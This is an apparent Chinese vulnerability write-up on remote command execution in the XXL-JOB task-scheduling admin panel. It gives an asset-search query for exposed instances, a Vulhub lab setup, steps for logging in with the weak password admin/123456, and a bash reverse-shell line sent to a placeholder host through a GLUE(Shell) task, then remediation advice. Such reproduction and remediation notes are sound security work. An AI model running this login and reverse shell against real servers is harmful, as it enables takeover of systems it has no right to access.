# XXL-JOB 后台任意命令执行漏洞

## 漏洞描述

XXL-JOB 是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。XXL-JOB 分为 admin 和 executor 两端，前者为后台管理页面，后者是任务执行的客户端。

若 XXL-JOB 后台管理页面存在弱口令，攻击者可在 GLUE 模式任务代码中写入攻击代码并推送到执行器执行，从而获取服务器权限。

参考链接：

- https://github.com/xuxueli/xxl-job/issues/2979
- https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g

## 漏洞影响

```
XXL-JOB
```

## 网络测绘

```
app="XXL-JOB" || title="任务调度中心" || ("invalid request, HttpMethod not support" && port="9999")
```

## 环境搭建

docker-compose.yml

```
version: '2'
services:
 admin:
   image: vulhub/xxl-job:2.2.0-admin
   depends_on:
    - db
   ports:
    - "8080:8080"
 executor:
   image: vulhub/xxl-job:2.2.0-executor
   depends_on:
    - admin
   ports:
    - "9999:9999"
 db:
   image: mysql:5.7
   environment:
    - MYSQL_ROOT_PASSWORD=root
```

Vulhub 执行如下命令启动 2.2.0 版本的 XXL-JOB：

```
docker-compose up -d
```

环境启动后，访问 `http://your-ip:8080/xxl-job-admin/toLogin` 即可查看到管理端登录页面，访问 `http://your-ip:9999` 可以查看到客户端（executor）。

![](images/XXL-JOB%20后台任意命令执行漏洞/image-20241112143143932.png)

## 漏洞复现

弱口令 `admin/123456` 登录后台，新增一个 GLUE 模式任务：

```
运行模式 GLUE(Shell)
```

![](images/XXL-JOB%20后台任意命令执行漏洞/image-20241112144436276.png)

点击 GLUE IDE，编辑脚本：

![](images/XXL-JOB%20后台任意命令执行漏洞/image-20241112144511969.png)

![](images/XXL-JOB%20后台任意命令执行漏洞/image-20241112144257939.png)

点击执行一次，探测是否出网：

![](images/XXL-JOB%20后台任意命令执行漏洞/image-20241112144713820.png)

再次点击 GLUE IDE，编辑脚本反弹 shell：

```plain
#!/bin/bash
bash -i >& /dev/tcp/your-ip/8888 0>&1 
```

![](images/XXL-JOB%20后台任意命令执行漏洞/image-20241112145109853.png)

## 漏洞修复

1. 开启 XXL-JOB 自带的鉴权组件：官方文档中搜索 “xxl.job.accessToken” ，按照文档说明启用即可。
2. 端口防护：及时更换默认的执行器端口，不建议直接将默认的 9999 端口开放到公网。
3. 端口访问限制：通过配置安全组限制只允许指定 IP 才能访问执行器 9999 端口。
